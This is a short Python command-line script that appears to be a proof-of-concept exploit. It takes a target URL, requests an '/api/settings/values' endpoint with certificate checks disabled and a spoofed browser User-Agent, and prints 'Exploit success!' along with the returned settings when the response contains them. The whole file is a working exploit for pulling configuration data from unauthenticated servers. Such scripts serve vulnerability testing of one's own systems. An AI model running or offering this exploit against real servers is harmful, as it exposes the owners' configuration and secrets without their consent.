import urllib.parse
import requests
import click
requests.packages.urllib3.disable_warnings()


@click.command()
@click.option('--url', '-u', help='set target url.', required=True)
def cli(**kwargs):
    return main(kwargs)


def main(options):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    with requests.get(urllib.parse.urljoin(options['url'], "./api/settings/values"), headers=headers, verify=False) as r:
        if 'settings' in r.text:
            print(f'[+] Exploit success!\n{r.text}')
        else:
            print('[-] Exploit failure!')
   

if __name__ == '__main__':
    cli()